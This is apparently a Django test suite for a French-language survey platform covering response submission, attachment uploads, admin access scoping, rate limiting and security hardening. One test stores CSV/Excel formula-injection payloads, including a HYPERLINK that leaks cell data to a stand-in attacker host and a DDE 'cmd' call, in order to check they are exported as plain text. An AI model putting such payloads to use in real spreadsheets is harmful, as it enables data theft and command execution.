import json
import shutil
import tempfile
import zipfile
from datetime import timedelta
from io import BytesIO, StringIO
from pathlib import Path

from django.contrib.auth.models import User
from django.core import mail
from django.core.files.uploadedfile import SimpleUploadedFile
from django.core.management import call_command
from django.test import Client, TestCase, override_settings
from django.urls import reverse
from django.utils import timezone
from openpyxl import load_workbook

from enquete.models import EPN, Campagne, Envoi, Reponse

VALEURS = {
    "A": {"A01": "Office test", "A02": "OT", "A03": "EPIC", "A04": "Décret 1", "A05": "1990-05-12", "A06": "Agriculture",
          "A07": "Ville", "A08": "Région 1", "A09": "+000 01 02 03", "A10": "", "A11": ""},
    "B": {"B01": "M. Directeur", "B02": "2022-01-15", "B03": "oui", "B04": 9, "B05": 4, "B06": "oui", "B07": "non",
          "B08": "oui"},
    "C": {"C01": "Missions", "C02": "Prestations", "C03": ["public"], "C04": "nationale", "C05": 1000},
    "D": {"D01": 100, "D02": 40, "D03": 60, "D04": 30, "D05": 70, "D09": 20, "D10": 80, "D11": 30, "D12": 50, "D13": 20,
          "D06": 5, "D07": 3, "D08": 250000000},
    "E": {"E01": 1000, "E02": 900, "E03": 600, "E04": 200, "E05": 400, "E06": 300, "E07": 200, "E08": None, "E09": None},
    "F": {"F01": 2, "F02": 5, "F03": 40, "F04": "oui", "F06": "fibre"},
    "G": {"G01": 10, "G02": 7, "G03": 85.5, "G04": [{"indicateur": "Satisfaction", "cible": "80", "realise": "75,5"}]},
    "H": {"H04": ["comptabilite", "paie"], "H05": "non", "H06": "", "H07": ["antivirus"]},
    "I": {"I01": ["financieres"], "I02": 4, "I03": "Besoins", "I04": ""},
    "J": {},
}
PDF = b"%PDF-1.4\n%test\n%%EOF\n"
MEDIA_TEST = tempfile.mkdtemp()


def pdf(nom="etats.pdf", contenu=PDF):
    return SimpleUploadedFile(nom, contenu, content_type="application/pdf")


class Base(TestCase):
    @classmethod
    def tearDownClass(cls):
        super().tearDownClass()
        shutil.rmtree(MEDIA_TEST, ignore_errors=True)

    def setUp(self):
        aujourd_hui = timezone.localdate()
        self.campagne = Campagne.objects.create(nom="Enquête test", exercice=2024, active=True,
                                                date_ouverture=aujourd_hui - timedelta(days=1),
                                                date_cloture=aujourd_hui + timedelta(days=10))
        self.epn = EPN.objects.create(nom="Office test", sigle="OT", categorie="EPIC", tutelle="Agriculture",
                                      email_contact="focal@epn.test")
        self.admin = User.objects.create_user("admin", password="motdepasse-solide", is_staff=True)

    def post(self, nom, args=(), donnees=None, client=None):
        return (client or self.client).post(reverse(nom, args=args), json.dumps(donnees or {}),
                                            content_type="application/json")

    def nouvelle_reponse(self):
        return Reponse.objects.create(campagne=self.campagne, epn=self.epn)

    def identifier(self, r):
        return self.post("api:identification", [r.jeton], {
            "nom": "Bamba", "prenom": "Karim", "fonction": "DAF", "email": "karim@epn.test",
            "telephone": "+000 01 02 03 04"})

    def deposer(self, r, code, fichier):
        return self.client.post(reverse("api:piece_publique", args=[r.jeton, code]), {"fichier": fichier})


@override_settings(EMAIL_BACKEND="django.core.mail.backends.locmem.EmailBackend", SITE_URL="http://testserver",
                   MEDIA_ROOT=MEDIA_TEST)
class ParcoursTests(Base):
    def test_parcours_complet_jusqua_l_envoi(self):
        r = self.nouvelle_reponse()
        etat = self.client.get(reverse("api:reponse", args=[r.jeton])).json()
        self.assertEqual(etat["etat"], "ouvert")
        self.assertFalse(etat["identifie"])
        self.assertEqual(self.identifier(r).status_code, 200)
        self.deposer(r, "J01", pdf("etats_financiers.pdf"))
        self.deposer(r, "J02", pdf("rapport.pdf"))
        for module in self.campagne.q.modules:
            resp = self.post("api:module", [r.jeton, module["code"]], {"valeurs": VALEURS[module["code"]], "valider": True})
            self.assertEqual(resp.status_code, 200, f"{module['code']} : {resp.json()['erreurs']}")
        resp = self.post("api:soumettre", [r.jeton], {"certification": True})
        self.assertEqual(resp.status_code, 200)
        r.refresh_from_db()
        self.assertEqual(r.statut, Reponse.Statut.SOUMIS)
        self.assertEqual(r.donnees["D01"], 100)
        self.assertEqual(r.donnees["G03"], 85.5)
        self.assertEqual(r.donnees["H04"], ["comptabilite", "paie"])
        self.assertEqual(r.donnees["A05"], "1990-05-12")
        self.assertEqual(r.donnees["G04"], [{"indicateur": "Satisfaction", "cible": 80, "realise": 75.5}])
        self.assertEqual(r.telephone, "+000 01 02 03 04")
        self.assertIn("Accusé", mail.outbox[-1].subject)
        # Une fois envoyée, la réponse n'est plus modifiable.
        resp = self.post("api:module", [r.jeton, "A"], {"valeurs": VALEURS["A"]})
        self.assertEqual(resp.status_code, 409)

    def test_identification_obligatoire_et_telephone_controle(self):
        r = self.nouvelle_reponse()
        self.assertEqual(self.post("api:module", [r.jeton, "A"], {"valeurs": {}}).status_code, 409)
        resp = self.post("api:identification", [r.jeton], {"nom": "B", "prenom": "K", "fonction": "DAF",
                                                            "email": "k@epn.test", "telephone": "12"})
        self.assertEqual(resp.status_code, 422)
        self.assertIn("telephone", resp.json()["erreurs"])

    def test_regle_de_coherence_et_brouillon_conserve(self):
        r = self.nouvelle_reponse()
        self.identifier(r)
        incoherent = VALEURS["D"] | {"D03": 61}
        resp = self.post("api:module", [r.jeton, "D"], {"valeurs": incoherent, "valider": True})
        self.assertEqual(resp.status_code, 422)
        self.assertIn("différent de « effectif total » (100)", resp.json()["erreurs"]["D02"][0])
        r.refresh_from_db()
        self.assertEqual(r.donnees["D03"], 61)  # rien n'est perdu
        self.assertNotIn("D", r.modules_completes)
        resp = self.post("api:module", [r.jeton, "D"], {"valeurs": {"D03": 60}})  # sauvegarde automatique
        self.assertEqual(resp.status_code, 200)
        r.refresh_from_db()
        self.assertIn("D", r.modules_completes)

    def test_format_invalide_signale_sans_effacer_le_reste(self):
        r = self.nouvelle_reponse()
        self.identifier(r)
        resp = self.post("api:module", [r.jeton, "D"], {"valeurs": {"D01": "beaucoup", "D02": 40}})
        self.assertIn("D01", resp.json()["erreurs"])
        r.refresh_from_db()
        self.assertEqual(r.donnees["D02"], 40)
        self.assertNotIn("D01", r.donnees)

    def test_envoi_refuse_si_rubriques_incompletes(self):
        r = self.nouvelle_reponse()
        self.identifier(r)
        resp = self.post("api:soumettre", [r.jeton], {"certification": True})
        self.assertEqual(resp.status_code, 400)
        self.assertIn("Rubriques à compléter", resp.json()["erreur"])

    def test_campagne_fermee(self):
        self.campagne.date_cloture = timezone.localdate() - timedelta(days=1)
        self.campagne.save()
        r = self.nouvelle_reponse()
        self.assertEqual(self.client.get(reverse("api:reponse", args=[r.jeton])).json()["etat"], "ferme")
        self.assertEqual(self.identifier(r).status_code, 403)

    def test_lien_invalide(self):
        self.assertEqual(self.client.get(reverse("api:reponse", args=["inconnu"])).status_code, 404)

    def test_csrf_exige_pour_les_ecritures(self):
        r = self.nouvelle_reponse()
        client = Client(enforce_csrf_checks=True)
        self.assertEqual(self.post("api:identification", [r.jeton], {}, client=client).status_code, 403)
        client.get(reverse("api:csrf"))
        jeton = client.cookies["csrftoken"].value
        resp = client.post(reverse("api:identification", args=[r.jeton]), "{}", content_type="application/json",
                           HTTP_X_CSRFTOKEN=jeton)
        self.assertEqual(resp.status_code, 422)  # passe le CSRF, échoue seulement sur la validation

    def test_pages_de_l_interface_servies(self):
        r = self.nouvelle_reponse()
        for url in ("/", r.lien.replace("http://testserver", ""), "/gestion/", "/gestion/reponses/12", "/connexion/"):
            self.assertIn(self.client.get(url).status_code, (200, 503), url)


@override_settings(EMAIL_BACKEND="django.core.mail.backends.locmem.EmailBackend", MEDIA_ROOT=MEDIA_TEST)
class PiecesJointesTests(Base):
    def setUp(self):
        super().setUp()
        self.r = self.nouvelle_reponse()
        self.identifier(self.r)

    def test_depot_puis_telechargement_par_le_lien(self):
        resp = self.deposer(self.r, "J01", pdf("etats_financiers.pdf"))
        self.assertEqual(resp.status_code, 200)
        self.assertEqual(resp.json()["pieces"]["J01"]["nom"], "etats_financiers.pdf")
        piece = self.r.pieces.get(code="J01")
        self.assertNotIn("etats_financiers", piece.fichier.name)  # nom de stockage aléatoire
        resp = self.client.get(reverse("api:piece_publique", args=[self.r.jeton, "J01"]))
        self.assertEqual(b"".join(resp.streaming_content), PDF)
        self.assertIn('filename="etats_financiers.pdf"', resp["Content-Disposition"])

    def test_pieces_obligatoires(self):
        resp = self.post("api:module", [self.r.jeton, "J"], {"valeurs": {}, "valider": True})
        self.assertEqual(resp.status_code, 422)
        self.assertEqual(set(resp.json()["erreurs"]), {"J01", "J02"})
        self.deposer(self.r, "J01", pdf())
        self.deposer(self.r, "J02", pdf())
        self.assertEqual(self.post("api:module", [self.r.jeton, "J"], {"valeurs": {}, "valider": True}).status_code, 200)

    def test_format_contenu_et_taille_controles(self):
        resp = self.deposer(self.r, "J01", SimpleUploadedFile("virus.exe", b"MZ..."))
        self.assertIn("Format non accepté", resp.json()["erreur"])
        resp = self.deposer(self.r, "J01", SimpleUploadedFile("faux.pdf", b"MZ\x90\x00"))
        self.assertIn("ne correspond pas", resp.json()["erreur"])
        from enquete import pieces
        ancien, pieces.TAILLE_MAX = pieces.TAILLE_MAX, 10
        try:
            self.assertIn("trop volumineux", self.deposer(self.r, "J01", pdf()).json()["erreur"])
        finally:
            pieces.TAILLE_MAX = ancien
        self.assertFalse(self.r.pieces.exists())

    def test_remplacement_et_suppression(self):
        self.deposer(self.r, "J01", pdf())
        ancien = self.r.pieces.get(code="J01").fichier.path
        self.deposer(self.r, "J01", pdf("v2.pdf"))
        self.assertEqual(self.r.pieces.get(code="J01").nom_original, "v2.pdf")
        self.assertFalse(Path(ancien).exists())
        resp = self.client.delete(reverse("api:piece_publique", args=[self.r.jeton, "J01"]))
        self.assertEqual(resp.status_code, 200)
        self.assertFalse(self.r.pieces.filter(code="J01").exists())

    def test_acces_aux_fichiers(self):
        self.deposer(self.r, "J01", pdf("etats.pdf"))
        self.deposer(self.r, "J02", pdf("rapport.pdf"))
        piece = self.r.pieces.get(code="J01")
        self.assertEqual(self.client.get(reverse("api:piece_publique", args=["autre", "J01"])).status_code, 404)
        self.assertEqual(self.client.get(reverse("api:piece_admin", args=[piece.pk])).status_code, 401)
        self.client.force_login(self.admin)
        self.assertEqual(self.client.get(reverse("api:piece_admin", args=[piece.pk])).status_code, 200)
        resp = self.client.get(reverse("api:pieces_zip", args=[self.r.pk]))
        self.assertEqual(sorted(zipfile.ZipFile(BytesIO(resp.content)).namelist()), ["J01_etats.pdf", "J02_rapport.pdf"])


@override_settings(EMAIL_BACKEND="django.core.mail.backends.locmem.EmailBackend", SITE_URL="http://testserver")
class GestionTests(Base):
    def test_connexion_et_acces_reserve(self):
        self.assertEqual(self.client.get(reverse("api:tableau_de_bord")).status_code, 401)
        resp = self.post("api:connexion", donnees={"identifiant": "admin", "mot_de_passe": "faux"})
        self.assertEqual(resp.status_code, 401)
        User.objects.create_user("lambda", password="motdepasse-solide")
        self.assertEqual(self.post("api:connexion", donnees={"identifiant": "lambda",
                                                             "mot_de_passe": "motdepasse-solide"}).status_code, 401)
        resp = self.post("api:connexion", donnees={"identifiant": "admin", "mot_de_passe": "motdepasse-solide"})
        self.assertEqual(resp.json()["identifiant"], "admin")
        self.assertEqual(self.client.get(reverse("api:tableau_de_bord")).status_code, 200)
        self.post("api:deconnexion")
        self.assertEqual(self.client.get(reverse("api:moi")).status_code, 401)

    def test_liens_uniques_invitations_et_relances(self):
        EPN.objects.create(nom="Autre", tutelle="Santé", email_contact="autre@epn.test")
        EPN.objects.create(nom="Inactif", tutelle="T", email_contact="x@epn.test", actif=False)
        self.client.force_login(self.admin)
        resp = self.post("api:liens")
        self.assertEqual(resp.json()["crees"], 2)
        liens = [l["lien"] for l in resp.json()["liens"]]
        self.assertEqual(len(set(liens)), 2)
        self.assertEqual(len(mail.outbox), 0)  # générer un lien n'envoie rien
        self.assertEqual(self.post("api:liens").json()["crees"], 0)  # idempotent
        resp = self.post("api:liens", donnees={"envoyer": True})
        self.assertEqual(resp.json()["envoyees"], 2)
        self.assertIn(liens[0], " ".join(m.body for m in mail.outbox))
        mail.outbox.clear()
        resp = self.post("api:relancer_retardataires")
        self.assertEqual(resp.json(), {"envoyees": 2, "total": 2})
        self.assertTrue(all("Rappel" in m.subject for m in mail.outbox))
        self.assertEqual(Envoi.objects.filter(type=Envoi.Type.RELANCE).count(), 2)
        ws = load_workbook(BytesIO(self.client.get(reverse("api:liens_xlsx")).content))["Liens"]
        self.assertEqual(ws.max_row, 3)

    def test_tableau_de_bord_export_statistiques_detail(self):
        r = self.nouvelle_reponse()
        r.statut = Reponse.Statut.VALIDE
        r.nom, r.prenom = "Bamba", "Karim"
        r.donnees = {"D01": 100, "D02": 40, "E01": 1000, "E02": 900, "A03": "EPIC", "A05": "1990-05-12", "H04": ["paie"]}
        r.date_soumission = timezone.now()
        r.save()
        self.client.force_login(self.admin)
        tdb = self.client.get(reverse("api:tableau_de_bord")).json()
        self.assertEqual((tdb["taux"], tdb["effectif_total"]), (100, 100))
        stats = self.client.get(reverse("api:statistiques")).json()
        self.assertEqual(stats["n"], 1)
        detail = self.client.get(reverse("api:reponse_detail", args=[r.pk])).json()
        lignes = {l["code"]: l["valeur"] for m in detail["modules"] for l in m["lignes"]}
        self.assertEqual(lignes["A05"], "12/05/1990")
        self.assertTrue(lignes["A03"].startswith("Établissement public à caractère industriel"))
        wb = load_workbook(BytesIO(self.client.get(reverse("api:export")).content))
        self.assertEqual(wb.sheetnames, ["Réponses", "Dictionnaire", "Statistiques", "Fréquences", "Indicateurs"])
        entetes = [c.value for c in wb["Réponses"][1]]
        self.assertEqual(wb["Réponses"].cell(row=2, column=entetes.index("D01") + 1).value, 100)
        resp = self.post("api:reponse_action", [r.pk, "rouvrir"])
        self.assertEqual(resp.json()["reponse"]["statut"], "en_cours")
        self.assertEqual(self.client.get(reverse("api:options")).status_code, 200)
        self.assertEqual(self.client.get(reverse("api:epn")).status_code, 200)
        self.assertEqual(self.client.get(reverse("api:campagnes")).status_code, 200)

    def test_creation_de_campagne_validee(self):
        self.client.force_login(self.admin)
        resp = self.post("api:campagnes", donnees={"nom": "2026", "exercice": 2025, "date_ouverture": "2026-03-01",
                                                   "date_cloture": "2026-02-01", "active": False})
        self.assertEqual(resp.status_code, 422)
        resp = self.post("api:campagnes", donnees={"nom": "2026", "exercice": 2025, "date_ouverture": "2026-03-01",
                                                   "date_cloture": "2026-03-31", "active": False})
        self.assertEqual(resp.status_code, 201)

    def test_commande_liens_epn(self):
        sortie = StringIO()
        call_command("liens_epn", "--generer", stdout=sortie)
        self.assertIn("1 lien(s) généré(s)", sortie.getvalue())
        self.assertIn("/formulaire", sortie.getvalue())
        self.assertEqual(sortie.getvalue().count("/r/"), 1)


@override_settings(EMAIL_BACKEND="django.core.mail.backends.locmem.EmailBackend", SITE_URL="http://testserver")
class LienPublicTests(Base):
    def test_liste_puis_envoi_du_lien_au_point_focal_officiel(self):
        d = self.client.get(reverse("api:formulaire_public")).json()
        self.assertTrue(d["ouverte"])
        self.assertEqual([e["nom"] for e in d["etablissements"]], ["Office test"])
        self.assertNotIn("email_contact", d["etablissements"][0])  # l'adresse n'est pas exposée
        resp = self.post("api:formulaire_public", donnees={"epn": self.epn.pk})
        self.assertEqual(resp.status_code, 200)
        self.assertEqual(resp.json()["email_masque"], "f•••@epn.test")  # longueur de l'adresse non révélée
        self.assertFalse(resp.json()["deja_envoye"])
        self.assertNotIn("/r/", json.dumps(resp.json()))  # le lien personnel n'est jamais renvoyé au navigateur
        r = Reponse.objects.get(epn=self.epn)
        self.assertEqual(mail.outbox[0].to, ["focal@epn.test"])
        self.assertIn(r.lien, mail.outbox[0].body)
        self.assertIsNotNone(r.date_invitation)  # compte comme une invitation : pas de second envoi depuis l'admin
        # Une deuxième demande dans les 5 minutes ne renvoie pas d'e-mail, ne crée pas de second lien, et le dit.
        resp = self.post("api:formulaire_public", donnees={"epn": self.epn.pk})
        self.assertTrue(resp.json()["deja_envoye"])
        self.assertEqual((len(mail.outbox), Reponse.objects.count()), (1, 1))

    def test_e_mail_d_acces_uniquement_a_l_adresse_officielle(self):
        r = Reponse.objects.create(campagne=self.campagne, epn=self.epn, email="perso@ailleurs.test", nom="X")
        self.post("api:formulaire_public", donnees={"epn": self.epn.pk})
        self.assertEqual(mail.outbox[0].to, ["focal@epn.test"])
        self.assertIn(r.lien, mail.outbox[0].body)

    def test_corps_malformes_refuses_proprement(self):
        for corps in ('{"epn": "abc"}', "[1]", '"texte"', '{"epn": null}', '{"epn": -3}'):
            resp = self.client.post(reverse("api:formulaire_public"), corps, content_type="application/json")
            self.assertEqual(resp.status_code, 400, corps)

    @override_settings(NB_PROXYS_DE_CONFIANCE=1)
    def test_limite_par_visiteur_reel_derriere_un_proxy(self):
        for i in range(10):  # 10 visiteurs différents derrière le même proxy
            self.client.post(reverse("api:formulaire_public"), json.dumps({"epn": 999}), content_type="application/json",
                             REMOTE_ADDR="10.0.0.2", HTTP_X_FORWARDED_FOR=f"41.0.0.{i}")
        resp = self.client.post(reverse("api:formulaire_public"), json.dumps({"epn": self.epn.pk}), content_type="application/json",
                                REMOTE_ADDR="10.0.0.2", HTTP_X_FORWARDED_FOR="41.9.9.9")
        self.assertEqual(resp.status_code, 200)
        for _ in range(10):  # le même visiteur, lui, est bien limité
            resp = self.client.post(reverse("api:formulaire_public"), json.dumps({"epn": 999}), content_type="application/json",
                                    REMOTE_ADDR="10.0.0.2", HTTP_X_FORWARDED_FOR="41.9.9.9")
        self.assertEqual(resp.status_code, 429)

    def test_etablissement_inconnu_ou_inactif(self):
        inactif = EPN.objects.create(nom="Fermé", tutelle="T", email_contact="x@epn.test", actif=False)
        self.assertEqual(self.post("api:formulaire_public", donnees={"epn": inactif.pk}).status_code, 400)
        self.assertEqual(self.post("api:formulaire_public", donnees={"epn": 9999}).status_code, 400)

    def test_limite_de_demandes(self):
        for _ in range(10):
            self.post("api:formulaire_public", donnees={"epn": 9999})
        self.assertEqual(self.post("api:formulaire_public", donnees={"epn": self.epn.pk}).status_code, 429)

    def test_campagne_fermee(self):
        self.campagne.date_cloture = timezone.localdate() - timedelta(days=1)
        self.campagne.save()
        self.assertFalse(self.client.get(reverse("api:formulaire_public")).json()["ouverte"])
        self.assertEqual(self.post("api:formulaire_public", donnees={"epn": self.epn.pk}).status_code, 403)

    def test_page_et_config(self):
        self.assertIn(self.client.get("/formulaire").status_code, (200, 503))
        self.assertEqual(self.client.get(reverse("api:config")).json()["lien_public"], "http://testserver/formulaire")


@override_settings(EMAIL_BACKEND="django.core.mail.backends.locmem.EmailBackend")
class SecuriteTests(Base):
    def test_export_excel_sans_injection_de_formules(self):
        from enquete import export_excel
        r = self.nouvelle_reponse()
        r.nom = '=HYPERLINK("http://pirate.example/?d="&A2,"Cliquez")'
        r.donnees = {"C01": '=cmd|"/C calc"!A0', "I03": "@SUM(1,1)", "A07": "-2+3"}
        r.statut, r.date_soumission = Reponse.Statut.SOUMIS, timezone.now()
        r.save()
        ws = load_workbook(BytesIO(export_excel.classeur(self.campagne, [r])))["Réponses"]
        entetes = [c.value for c in ws[1]]
        for col in ("Nom du répondant", "C01", "I03", "A07"):
            cellule = ws.cell(row=2, column=entetes.index(col) + 1)
            self.assertEqual(cellule.data_type, "s", col)  # texte, jamais formule
        self.assertEqual(ws.cell(row=2, column=entetes.index("C01") + 1).value, '=cmd|"/C calc"!A0')  # contenu conservé

    def test_blocage_apres_echecs_de_connexion_api_et_django_admin(self):
        for i in range(5):
            self.assertEqual(self.post("api:connexion", donnees={"identifiant": "admin", "mot_de_passe": f"faux{i}"}).status_code, 401)
        resp = self.post("api:connexion", donnees={"identifiant": "admin", "mot_de_passe": "motdepasse-solide"})
        self.assertEqual(resp.status_code, 429)  # même le bon mot de passe est refusé pendant le blocage
        self.assertIn("15 minutes", resp.json()["erreur"])
        resp = self.client.post("/django-admin/login/", {"username": "admin", "password": "motdepasse-solide"})
        self.assertNotEqual(resp.status_code, 302)  # /django-admin/ est protégé de la même façon

    def test_succes_efface_les_echecs(self):
        for i in range(4):
            self.post("api:connexion", donnees={"identifiant": "admin", "mot_de_passe": f"faux{i}"})
        self.assertEqual(self.post("api:connexion", donnees={"identifiant": "admin", "mot_de_passe": "motdepasse-solide"}).status_code, 200)
        from enquete.models import EchecConnexion
        self.assertFalse(EchecConnexion.objects.filter(identifiant="admin").exists())

    def test_requete_trop_volumineuse_refusee_avant_lecture(self):
        r = self.nouvelle_reponse()
        resp = self.client.post(reverse("api:piece_publique", args=[r.jeton, "J01"]), data=b"x",
                                content_type="application/octet-stream", CONTENT_LENGTH=str(50 * 1024 * 1024))
        self.assertEqual(resp.status_code, 413)

    def test_journaux_sans_jetons(self):
        import logging
        from enquete.journaux import FiltreJetons
        enreg = logging.LogRecord("django.request", logging.WARNING, __file__, 1, "%s: %s",
                                  ("Not Found", "/api/r/JETONSECRET123/modules/A/"), None)
        FiltreJetons().filter(enreg)
        self.assertEqual(enreg.getMessage(), "Not Found: /api/r/***/modules/A/")

    def test_mailpit_reserve_au_poste_et_au_profil_dev(self):
        from pathlib import Path
        compose = (Path(__file__).resolve().parents[2] / "docker-compose.yml").read_text(encoding="utf-8")
        bloc = compose[compose.index("  mailpit:"):compose.index("  backup:")]
        self.assertIn('profiles: ["dev"]', bloc)
        self.assertIn('"127.0.0.1:8025:8025"', bloc)


@override_settings(EMAIL_BACKEND="django.core.mail.backends.locmem.EmailBackend", SITE_URL="http://testserver",
                   MEDIA_ROOT=MEDIA_TEST)
class PerimetreEtRevocationTests(Base):
    def setUp(self):
        super().setUp()
        from enquete.models import ProfilEquipe
        self.autre = EPN.objects.create(nom="Hôpital", tutelle="Santé", email_contact="sante@epn.test")
        self.r_agri = Reponse.objects.create(campagne=self.campagne, epn=self.epn, statut=Reponse.Statut.SOUMIS,
                                             date_soumission=timezone.now(), donnees={"D01": 10})
        self.r_sante = Reponse.objects.create(campagne=self.campagne, epn=self.autre, statut=Reponse.Statut.SOUMIS,
                                              date_soumission=timezone.now(), donnees={"D01": 99})
        self.superviseur = User.objects.create_user("sup", password="motdepasse-solide", is_staff=True)
        ProfilEquipe.objects.create(utilisateur=self.superviseur, tutelles="Agriculture")

    def test_superviseur_limite_a_sa_tutelle(self):
        self.client.force_login(self.superviseur)
        moi = self.client.get(reverse("api:moi")).json()
        self.assertEqual((moi["perimetre"], moi["administrateur"]), (["Agriculture"], False))
        noms = [r["epn"]["nom"] for r in self.client.get(reverse("api:reponses")).json()["reponses"]]
        self.assertEqual(noms, ["Office test"])
        self.assertEqual(self.client.get(reverse("api:reponse_detail", args=[self.r_sante.pk])).status_code, 404)
        self.assertEqual(self.post("api:reponse_action", [self.r_sante.pk, "rouvrir"]).status_code, 404)
        self.assertEqual(self.client.get(reverse("api:tableau_de_bord")).json()["effectif_total"], 10)
        self.assertEqual(self.client.get(reverse("api:statistiques") + "?base=envoyees").json()["n"], 1)
        self.assertEqual(self.client.get(reverse("api:options")).json()["tutelles"], ["Agriculture"])
        self.assertEqual([e["nom"] for e in self.client.get(reverse("api:epn")).json()["epn"]], ["Office test"])
        ws = load_workbook(BytesIO(self.client.get(reverse("api:export") + "?base=envoyees").content))["Réponses"]
        self.assertEqual([c.value for c in ws["A"]][1:], ["Office test"])
        self.assertEqual(self.client.get(reverse("api:pieces_zip", args=[self.r_sante.pk])).status_code, 404)
        self.assertEqual([c["total"] for c in self.client.get(reverse("api:campagnes")).json()["campagnes"]], [1])

    def test_superviseur_ne_peut_pas_agir_hors_perimetre(self):
        EPN.objects.create(nom="Clinique", tutelle="Santé", email_contact="clinique@epn.test")
        self.client.force_login(self.superviseur)
        self.post("api:liens", donnees={"envoyer": True})
        self.assertFalse(Reponse.objects.filter(epn__nom="Clinique").exists())  # pas de lien créé hors périmètre
        self.assertTrue(all("sante" not in ",".join(m.to) and "clinique" not in ",".join(m.to) for m in mail.outbox))
        resp = self.post("api:campagnes", donnees={"nom": "X", "exercice": 2025, "date_ouverture": "2026-03-01",
                                                   "date_cloture": "2026-03-31", "active": False})
        self.assertEqual(resp.status_code, 403)
        resp = self.client.post(reverse("api:epn"), {"fichier": SimpleUploadedFile("e.xlsx", b"x")})
        self.assertEqual(resp.status_code, 403)

    def test_administrateur_sans_profil_voit_tout(self):
        self.client.force_login(self.admin)
        self.assertEqual(len(self.client.get(reverse("api:reponses")).json()["reponses"]), 2)
        self.assertTrue(self.client.get(reverse("api:moi")).json()["administrateur"])

    def test_remplacer_le_lien(self):
        ancien = self.r_agri.jeton
        self.client.force_login(self.admin)
        resp = self.post("api:reponse_action", [self.r_agri.pk, "remplacer-lien"], {"envoyer": True})
        self.assertEqual(resp.status_code, 200)
        self.r_agri.refresh_from_db()
        self.assertNotEqual(self.r_agri.jeton, ancien)
        self.client.logout()
        self.assertEqual(self.client.get(reverse("api:reponse", args=[ancien])).status_code, 404)  # ancien lien mort
        nouveau = self.client.get(reverse("api:reponse", args=[self.r_agri.jeton])).json()
        self.assertEqual(nouveau["donnees"], {"D01": 10})  # réponses conservées
        self.assertEqual(mail.outbox[-1].to, ["focal@epn.test"])
        self.assertIn(self.r_agri.lien, mail.outbox[-1].body)
        self.assertNotIn(ancien, mail.outbox[-1].body)

    def test_remplacer_le_lien_sans_envoi(self):
        self.client.force_login(self.admin)
        self.post("api:reponse_action", [self.r_agri.pk, "remplacer-lien"], {"envoyer": False})
        self.assertEqual(len(mail.outbox), 0)

    def test_commande_compte_equipe(self):
        sortie = StringIO()
        call_command("compte_equipe", "sup2", "--tutelle", "Santé", "--tutelle", "Éducation",
                     "--mot-de-passe", "Un-mot-de-passe-solide", stdout=sortie)
        from enquete.models import tutelles_autorisees
        u = User.objects.get(username="sup2")
        self.assertTrue(u.is_staff)
        self.assertEqual(tutelles_autorisees(u), ["Santé", "Éducation"])


class DurcissementTests(Base):
    def test_politique_de_contenu_et_en_tetes(self):
        resp = self.client.get(reverse("api:config"))
        csp = resp["Content-Security-Policy"]
        self.assertIn("script-src 'self'", csp)
        self.assertNotIn("unsafe-inline' https://fonts.googleapis.com; script", csp)
        self.assertIn("frame-ancestors 'none'", csp)
        self.assertIn("Permissions-Policy", resp.headers)

    @override_settings(SECURE_HSTS_SECONDS=31536000)
    def test_hsts_en_https(self):
        resp = self.client.get(reverse("api:config"), secure=True)
        self.assertEqual(resp["Strict-Transport-Security"], "max-age=31536000")

    @override_settings(NB_PROXYS_DE_CONFIANCE=1)
    def test_x_forwarded_for_ignore_si_le_site_est_expose_directement(self):
        from django.test import RequestFactory
        from enquete.securite import ip_client
        rf = RequestFactory()
        # Connexion directe depuis Internet : l'en-tête fourni par le visiteur n'est pas cru.
        self.assertEqual(ip_client(rf.get("/", REMOTE_ADDR="41.202.1.5", HTTP_X_FORWARDED_FOR="1.2.3.4")), "41.202.1.5")
        # Derrière le proxy (réseau privé) : l'adresse réelle est retenue…
        self.assertEqual(ip_client(rf.get("/", REMOTE_ADDR="172.18.0.3", HTTP_X_FORWARDED_FOR="41.9.9.9")), "41.9.9.9")
        # … sauf si elle n'est pas une adresse IP valide.
        self.assertEqual(ip_client(rf.get("/", REMOTE_ADDR="172.18.0.3", HTTP_X_FORWARDED_FOR="<script>")), "172.18.0.3")

    @override_settings(DEBUG=False, SITE_URL="https://enquete.example", SESSION_COOKIE_SECURE=False, EMAIL_HOST="mailpit")
    def test_alertes_reglages_de_production(self):
        import os
        from enquete.checks import reglages_de_production
        ancien = os.environ.get("CHARGER_DONNEES_DEMO")
        os.environ["CHARGER_DONNEES_DEMO"] = "1"
        try:
            ids = {a.id for a in reglages_de_production(None)}
        finally:
            os.environ.pop("CHARGER_DONNEES_DEMO") if ancien is None else os.environ.__setitem__("CHARGER_DONNEES_DEMO", ancien)
        self.assertEqual(ids, {"enquete.W001", "enquete.W002", "enquete.W003"})

    def test_import_excel_avec_lecteur_xml_protege(self):
        import openpyxl.xml
        self.assertTrue(openpyxl.xml.DEFUSEDXML)

    def test_exemple_env_sur_par_defaut(self):
        from pathlib import Path
        exemple = (Path(__file__).resolve().parents[2] / ".env.example").read_text(encoding="utf-8")
        self.assertIn("\nCOOKIES_SECURE=1", exemple)
        self.assertIn("\nCHARGER_DONNEES_DEMO=0", exemple)


class SanteTests(TestCase):
    @override_settings(SECURE_SSL_REDIRECT=True, ALLOWED_HOSTS=["enquete.example", "localhost"])
    def test_point_de_sante_en_http_meme_avec_redirection_https(self):
        resp = self.client.get(reverse("api:sante"), HTTP_HOST="localhost")
        self.assertEqual((resp.status_code, resp.json()), (200, {"etat": "ok"}))
        # Le reste du site est bien redirigé vers https.
        self.assertEqual(self.client.get(reverse("api:config"), HTTP_HOST="enquete.example").status_code, 301)
